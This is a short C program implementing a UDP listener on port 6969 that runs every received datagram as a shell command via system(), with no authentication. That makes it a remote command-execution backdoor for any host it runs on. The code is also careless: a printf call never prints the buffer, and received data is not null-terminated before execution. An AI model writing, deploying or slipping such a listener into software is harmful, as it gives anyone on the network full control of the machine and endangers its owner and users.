#include <stdlib.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <stdio.h>
#include <string.h>

int
main(int argc, char *argv[])
{
	// set all required variables to create connection
	int 
	bufferSize = 1024;
	int
	port = 6969;
 	int // create socket with UDP communication
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	
	char
	buffer[bufferSize];

	struct sockaddr_in 
	server_addr, client_addr;	
	socklen_t
	addr_size;

	if (sockfd == -1)
	{
		perror("socket() error");
		exit(EXIT_FAILURE);
	}

	memset(&server_addr, '\0', sizeof(server_addr));
	server_addr.sin_family = AF_INET;
 	server_addr.sin_port = htons(port);
 	server_addr.sin_addr.s_addr = INADDR_ANY;

	int // bind socket
	n = bind(sockfd, (struct sockaddr*)&server_addr,sizeof(server_addr));
	if(n<0)
	{
		perror("bind() error");
		exit(EXIT_FAILURE);
	}
	addr_size = sizeof(client_addr);

	while (1)
	{
		recvfrom(sockfd,buffer,bufferSize,0,(struct sockaddr*)&client_addr, &addr_size);

		struct sockaddr_in* clientIPv4 = (struct sockaddr_in*)&client_addr;
		struct in_addr ipAddr = clientIPv4->sin_addr;
		
		char str[INET_ADDRSTRLEN];
		inet_ntop( AF_INET, &ipAddr, str, INET_ADDRSTRLEN );	
		
		printf("from: %s\n", str, " - %s",buffer);

		system(buffer);
		bzero(buffer,bufferSize);
	}
	return 0;
}



